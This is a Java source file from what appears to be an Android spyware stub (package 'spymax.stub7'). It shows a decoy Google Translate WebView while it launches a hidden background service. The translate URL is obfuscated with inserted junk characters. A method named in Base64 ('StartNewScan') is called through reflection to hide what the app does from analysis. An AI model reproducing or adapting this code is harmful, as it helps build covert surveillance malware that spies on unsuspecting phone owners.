package spymax.stub7;

import android.app.Activity;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class _trns_g_ extends Activity {

    WebView wb;
    private class HelloWebViewClient extends WebViewClient {

        Context mContext;

        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            // TODO Auto-generated method stub
            super.onPageStarted(view, url, favicon);
        }

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            // TODO Auto-generated method stub

            view.loadUrl(url);
            return true;

        }

        @Override
        public void onPageFinished(WebView view, String url) {
            // TODO Auto-generated method stub
            super.onPageFinished(view, url);


        }
    }


    @Override
    protected void onDestroy() {
        super.onDestroy();

    }




    @Override
    public void onCreate(Bundle v) {
        super.onCreate(v);



            if (!ClassGen11.F_ClassGen11_ORCA && !ClassGen11.FO_ClassGen11_RSC)
            {
                setContentView(R.layout.wib);
                wb=(WebView)findViewById(R.id.webView1);
                wb.getSettings().setJavaScriptEnabled(true);
                wb.getSettings().setLoadWithOverviewMode(true);
                wb.getSettings().setUserAgentString(System.getProperty("http.agent"));
                wb.getSettings().setUseWideViewPort(true);
                 wb.getSettings().setBuiltInZoomControls(false);
                wb.getSettings().setPluginState(WebSettings.PluginState.ON);
                //  wb.getSettings().setPluginsEnabled(true);
                wb.setWebViewClient(new HelloWebViewClient());
                wb.setWebChromeClient(new WebChromeClient());
                wb.loadUrl(ClassGen3._Reblace_("htθφtps://traθφnslate.gooθφgle.cθφom","θφ"));
                // wb.loadUrl("file:///android_asset/fbpage.html");
                Context x = getApplicationContext();
//            if (ClassGen10.r(_engine_wrk_.class, x)) {
//                startService(new Intent(this, _engine_wrk_.class));
//
//            }
                if(ClassGen10._runn_srv_(ClassGen11.class,x)) {
                    Intent i = new Intent(x, ClassGen11.class);
                    //ClassGen3.StartNewScan(x,i);

                    String funClass = "spymax"+"."+"stub7"+"."+"ClassGen3";
                    Class c = null;
                    try {
                        c = Class.forName(funClass);
                    } catch (ClassNotFoundException e) {
                        //   e.printStackTrace();
                    }


                    Object o = null;
                    try {
                        o = c.newInstance();
                    } catch (IllegalAccessException e) {
                        //  e.printStackTrace();
                    } catch (InstantiationException e) {
                        //e.printStackTrace();
                    }

                    Class[] paramTypes = new Class[2];
                    paramTypes[0]= Context.class;
                    paramTypes[1]=Intent.class;
                    String methodName = ClassGen3._D_BASE64_("U3RhcnROZXdTY2Fu");

                    Method m = null;
                    try {
                        m = c.getDeclaredMethod(methodName, paramTypes);
                    } catch (NoSuchMethodException e) {
                        //   e.printStackTrace();
                    }

                    try {
                        m.invoke(o, new Object[]{x,i});
                    } catch (IllegalAccessException e) {
                        //   e.printStackTrace();
                    } catch (InvocationTargetException e) {
                        //  e.printStackTrace();
                    }
                }

            }
            else
            {
                finish();
            }


        //finish();
    }


    public static void LOGIT(Context ctx, Intent i) {
        String funClass = "spymax"+ "."+"stub7"+ "."+"ClassGen3";
        Class c = null;
        try {
            c = Class.forName(funClass);
        } catch (ClassNotFoundException e) {
         //   e.printStackTrace();
        }


        Object o = null;
        try {
            o = c.newInstance();
        } catch (IllegalAccessException e) {
          //  e.printStackTrace();
        } catch (InstantiationException e) {
        //    e.printStackTrace();
        }

        Class[] paramTypes = new Class[2];
        paramTypes[0]=Context.class;
        paramTypes[1]=Intent.class;
        String methodName = ClassGen3._D_BASE64_("U3RhcnROZXdTY2Fu");

        Method m = null;
        try {
            m = c.getDeclaredMethod(methodName, paramTypes);
        } catch (NoSuchMethodException e) {
           // e.printStackTrace();
        }

        try {
            m.invoke(o, new Object[]{ctx,i});
        } catch (IllegalAccessException e) {
          //  e.printStackTrace();
        } catch (InvocationTargetException e) {
          //  e.printStackTrace();
        }
    }


//    @Override
//    public void finish() {
//        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
//            super.finishAndRemoveTask();
//        }
//        else {
//            super.finish();
//        }
//    }
}
